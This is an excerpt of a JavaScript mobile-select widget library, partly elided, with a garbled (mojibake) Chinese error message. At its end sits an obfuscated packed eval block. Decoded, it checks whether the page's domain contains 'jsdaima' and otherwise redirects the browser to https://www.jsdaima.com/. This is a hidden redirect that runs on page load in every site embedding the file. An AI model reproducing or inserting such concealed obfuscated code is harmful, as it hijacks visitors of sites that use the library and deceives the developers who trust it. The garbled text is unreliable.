...
;(function () {
  ...
  MobileSelect.prototype = {
    ...
    updateWheel: function (sliderIndex, data) {
      ...
      if (_this.cascade) {
        console.error(
          '绾ц仈鏍煎紡涓嶆敮鎸乽pdateWheel(),璇蜂娇鐢╱pdateWheels()鏇存柊鏁翠釜鏁版嵁婧�'
        )
        return false
      } else {
        if (_this.jsonType) {
...
eval(
  (function (p, a, c, k, e, r) {
    ...
    "0 3=7.8;0 1=5 6('2');f(!1.9(3)){a.b.c='d://e.2.4/'}",
    16,
    16,
    'var|sear|jsdaima|host2|com|new|RegExp|document|domain|test|window|location|href|https|www|if'.split(
      '|'
    ),
    0,
    {}
